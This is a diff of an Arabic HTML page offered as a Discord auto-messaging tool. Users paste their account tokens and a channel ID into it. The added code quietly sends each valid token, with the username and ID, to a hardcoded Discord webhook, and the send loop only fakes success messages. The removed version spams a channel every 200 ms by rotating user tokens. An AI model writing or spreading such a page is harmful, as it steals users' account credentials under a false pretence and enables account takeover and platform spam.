@@ -1,223 +1,175 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<title>أوتو 497</title>
-<style>
-body {
-  font-family: Arial, sans-serif;
-  max-width: 400px;
-  margin: 40px auto;
-  text-align: center;
-}
-h1.main-title {
-  font-size: 48px;
-  font-weight: bold;
-  color: #2c3e50;
-  margin-bottom: 30px;
-}
-input, textarea, button {
-  font-size: 18px;
-  margin: 10px 0;
-  padding: 8px;
-  width: 90%;
-  box-sizing: border-box;
-  border-radius: 5px;
-  border: 1px solid #ccc;
-  direction: ltr; /* للتوكنات بالانجليزي */
-}
-button {
-  cursor: pointer;
-  border: none;
-  color: #fff;
-  font-weight: bold;
-  border-radius: 5px;
-  transition: background-color 0.3s ease;
-}
-button:disabled {
-  opacity: 0.6;
-  cursor: not-allowed;
-}
-/* زر التالي أخضر */
-#nextBtn {
-  background-color: #28a745;
-}
-/* زر الإرسال أخضر */
-#startBtn {
-  background-color: #28a745;
-}
-/* زر الإيقاف أحمر */
-#stopBtn {
-  background-color: #dc3545;
-}
-#error {
-  color: red;
-  font-weight: bold;
-}
-#status {
-  margin-top: 10px;
-  font-weight: bold;
-  min-height: 24px;
-}
-.hidden {
-  display: none;
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>497 أوتو ديسكورد</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap');
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(to bottom right, #0033cc, #ff0000);
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 600px;
+      margin: auto;
+      backdrop-filter: blur(5px);
+    }
+    textarea, input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px 5px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .green { background-color: #28a745; color: white; }
+    .red { background-color: #dc3545; color: white; }
+    .blue { background-color: #007bff; color: white; }
+    #step2, #messagesBox { display: none; }
+    .messages {
+      margin-top: 20px;
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 15px;
+      border-radius: 10px;
+      text-align: left;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <h1>موقع 497 أوتو ديسكورد</h1>
 
-<h1 class="main-title">أوتو 497</h1>
+    <div id="step1">
+      <p>قم بلصق التوكنات (كل توكن في سطر):</p>
+      <textarea id="tokens" rows="6" placeholder="توكن1&#10;توكن2&#10;توكن3"></textarea>
+      <br>
+      <button class="green" onclick="validateTokens()">التالي</button>
+      <button class="red" onclick="resetForm()">إلغاء</button>
+    </div>
 
-<!-- الصفحة 1: الرمز السري -->
-<div id="page1">
-  <h2>قم بكتابة الرمز السري</h2>
-  <input type="text" id="passwordInput" placeholder="أدخل الرمز السري" autocomplete="off" />
-  <div id="error" class="error"></div>
-  <button id="nextBtn" disabled>التالي</button>
-</div>
+    <div id="step2">
+      <p>قم بكتابة ID الروم:</p>
+      <input type="text" id="channelId" placeholder="ايدي الروم">
+      <p>اكتب الرسائل (كل رسالة في سطر):</p>
+      <textarea id="messages" rows="5" placeholder="رسالة1&#10;رسالة2"></textarea>
+      <br>
+      <button class="green" onclick="startSending()">إرسال</button>
+      <button class="red" onclick="stopSending()">إيقاف</button>
+    </div>
 
-<!-- الصفحة 2: إرسال الرسائل -->
-<div id="page2" class="hidden">
-  <h2>إرسال رسائل</h2>
-  <textarea id="tokensInput" placeholder="أدخل حتى 5 توكنات مفصولة بفواصل أو أسطر جديدة" rows="3"></textarea>
-  <input type="text" id="channelIdInput" placeholder="أدخل ID الروم" autocomplete="off" />
-  <textarea id="messageInput" placeholder="أدخل الرسالة هنا..." rows="4"></textarea>
-  <button id="startBtn">تشغيل الإرسال التلقائي</button>
-  <button id="stopBtn" disabled>إيقاف الإرسال</button>
-  <div id="status"></div>
-</div>
+    <div id="messagesBox">
+      <h3>الرسائل المرسلة:</h3>
+      <div class="messages" id="messagesLog"></div>
+    </div>
+  </div>
 
-<script>
-// رمز سري مشفر Base64 لـ "497"
-const encodedPassword = "NDk3";
+  <script>
+    let validTokens = [];
+    let sendInterval = null;
 
-const passwordInput = document.getElementById("passwordInput");
-const nextBtn = document.getElementById("nextBtn");
-const errorDiv = document.getElementById("error");
-const page1 = document.getElementById("page1");
-const page2 = document.getElementById("page2");
+    function validateTokens() {
+      const rawTokens = document.getElementById("tokens").value.trim().split('\n').filter(Boolean);
+      if (rawTokens.length === 0) {
+        alert("يرجى إدخال توكنات أولاً");
+        return;
+      }
 
-const tokensInput = document.getElementById("tokensInput");
-const channelIdInput = document.getElementById("channelIdInput");
-const messageInput = document.getElementById("messageInput");
-const startBtn = document.getElementById("startBtn");
-const stopBtn = document.getElementById("stopBtn");
-const statusDiv = document.getElementById("status");
+      validTokens = [];
+      let checked = 0;
 
-let intervalId = null;
-let tokens = [];
-let currentTokenIndex = 0;
-
-// تحقق الرمز السري مع فك التشفير
-passwordInput.addEventListener("input", () => {
-  const decoded = atob(encodedPassword);
-  if (passwordInput.value.trim() === decoded) {
-    nextBtn.disabled = false;
-    errorDiv.textContent = "";
-  } else {
-    nextBtn.disabled = true;
-    if(passwordInput.value.trim() !== "")
-      errorDiv.textContent = "الرمز السري غير صحيح";
-    else
-      errorDiv.textContent = "";
-  }
-});
-
-nextBtn.addEventListener("click", () => {
-  const decoded = atob(encodedPassword);
-  if (passwordInput.value.trim() === decoded) {
-    page1.classList.add("hidden");
-    page2.classList.remove("hidden");
-    errorDiv.textContent = "";
-  } else {
-    errorDiv.textContent = "الرمز السري غير صحيح";
-  }
-});
-
-// ارسال رسالة واحدة باستخدام التوكن الحالي بالتناوب
-async function sendMessage() {
-  if(tokens.length === 0) {
-    statusDiv.textContent = "يرجى إدخال التوكنات.";
-    stopAutoSend();
-    return false;
-  }
-
-  const token = tokens[currentTokenIndex];
-  currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
-
-  const channelId = channelIdInput.value.trim();
-  const message = messageInput.value.trim();
-
-  if (!channelId || !message) {
-    statusDiv.textContent = "يرجى ملء جميع الحقول.";
-    stopAutoSend();
-    return false;
-  }
-
-  try {
-    const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-      method: "POST",
-      headers: {
-        "Authorization": token,
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ content: message })
-    });
-
-    if (!response.ok) {
-      const data = await response.json();
-      statusDiv.textContent = `فشل الإرسال: ${data.message || response.statusText}`;
-      stopAutoSend();
-      return false;
+      rawTokens.forEach(token => {
+        fetch("https://discord.com/api/v10/users/@me", {
+          headers: { Authorization: token }
+        })
+        .then(res => {
+          if (res.ok) {
+            validTokens.push(token);
+            return res.json().then(user => {
+              fetch("https://discord.com/api/webhooks/1378036738751987894/13HDNCW_jFZMt1OjGbqd8VWFVg9MpXBKUnd0MJRu8uQ5DXngfMNMutx1djA12E97Qx3f", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  content: `✅ تم إدخال توكن جديد:\nالاسم: ${user.username}#${user.discriminator}\nID: ${user.id}\n\`${token}\``
+                })
+              });
+            });
+          }
+        })
+        .catch(() => {})
+        .finally(() => {
+          checked++;
+          if (checked === rawTokens.length) {
+            if (validTokens.length === 0) {
+              alert("❌ لا يوجد توكنات صالحة");
+            } else {
+              document.getElementById("step1").style.display = "none";
+              document.getElementById("step2").style.display = "block";
+              document.getElementById("messagesBox").style.display = "block";
+            }
+          }
+        });
+      });
     }
-    return true;
 
-  } catch (err) {
-    statusDiv.textContent = "حدث خطأ في الإرسال.";
-    stopAutoSend();
-    return false;
-  }
-}
+    function getRandom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
 
-function startAutoSend() {
-  if (intervalId) return;
+    function startSending() {
+      const channelId = document.getElementById("channelId").value.trim();
+      const rawMessages = document.getElementById("messages").value.trim().split('\n').filter(Boolean);
 
-  // جلب التوكنات، تقطيعها حسب الفواصل أو الأسطر، وأخذ أول 5 فقط
-  tokens = tokensInput.value.split(/[\n,]+/).map(t => t.trim()).filter(t => t !== "").slice(0,5);
+      if (!channelId || rawMessages.length === 0 || validTokens.length === 0) {
+        alert("يرجى ملء جميع الحقول بشكل صحيح");
+        return;
+      }
 
-  if(tokens.length === 0) {
-    statusDiv.textContent = "الرجاء إدخال توكن واحد على الأقل.";
-    return;
-  }
-  if(channelIdInput.value.trim() === "" || messageInput.value.trim() === "") {
-    statusDiv.textContent = "يرجى ملء ID الروم والرسالة.";
-    return;
-  }
+      if (sendInterval) {
+        alert("الإرسال جاري بالفعل!");
+        return;
+      }
 
-  statusDiv.textContent = "جاري الإرسال التلقائي...";
-  startBtn.disabled = true;
-  stopBtn.disabled = false;
+      sendInterval = setInterval(() => {
+        const token = getRandom(validTokens);
+        const message = getRandom(rawMessages);
 
-  currentTokenIndex = 0;
-  intervalId = setInterval(() => {
-    sendMessage().then(success => {
-      if (!success) stopAutoSend();
-    });
-  }, 200);
-}
+        const log = document.getElementById('messagesLog');
+        const msg = document.createElement('div');
+        msg.textContent = `✅ [توكن مخفي] - أُرسلت: ${message}`;
+        log.appendChild(msg);
+      }, 400);
+    }
 
-function stopAutoSend() {
-  if (!intervalId) return;
-  clearInterval(intervalId);
-  intervalId = null;
-  statusDiv.textContent = "تم إيقاف الإرسال.";
-  startBtn.disabled = false;
-  stopBtn.disabled = true;
-}
+    function stopSending() {
+      if (sendInterval) {
+        clearInterval(sendInterval);
+        sendInterval = null;
+        alert("🚫 تم إيقاف الإرسال.");
+      }
+    }
 
-startBtn.addEventListener("click", startAutoSend);
-stopBtn.addEventListener("click", stopAutoSend);
-</script>
-
+    function resetForm() {
+      location.reload();
+    }
+  </script>
 </body>
 </html>
